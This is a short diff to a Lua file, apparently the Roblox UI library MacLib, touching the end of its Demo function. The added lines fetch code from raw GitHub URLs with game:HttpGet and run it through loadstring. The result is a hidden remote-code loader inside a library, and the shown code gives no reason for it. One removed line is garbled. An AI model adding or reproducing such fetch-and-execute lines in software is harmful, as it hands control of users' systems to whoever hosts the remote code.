@@ -5888,8 +5888,8 @@ function MacLib:Demo()
 
 	tabs.Main:Select()
 	MacLib:LoadAutoLoadConfig()
-    loadWithTimeout("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/27162")
-    ing(game:HttpGet("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/1625"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/27162"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OsSosWSwagy556/RAYFA21/refs/heads/main/1625"))()
 end
 
 return MacLib
